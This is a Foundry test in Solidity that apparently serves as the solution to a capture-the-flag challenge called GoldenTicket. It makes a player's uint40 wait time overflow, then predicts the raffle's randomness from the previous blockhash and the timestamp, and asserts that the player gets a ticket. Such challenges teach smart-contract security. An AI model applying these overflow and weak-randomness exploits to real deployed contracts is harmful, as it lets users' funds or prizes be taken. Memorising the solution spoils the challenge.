// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/GoldenTicket.sol";

contract GoldenTicketTest is Test {
    GoldenTicket public target;
    address public player;

    function setUp() public {
        target = new GoldenTicket();
        player = vm.addr(1);

        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
    }

    function testGoldenTicket() public {
        vm.startPrank(player);

        target.joinWaitlist();
        target.updateWaitTime(type(uint40).max - target.waitlist(player) + 1);

        target.joinRaffle(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        assertTrue(target.hasTicket(player));

        vm.stopPrank();
    }
}
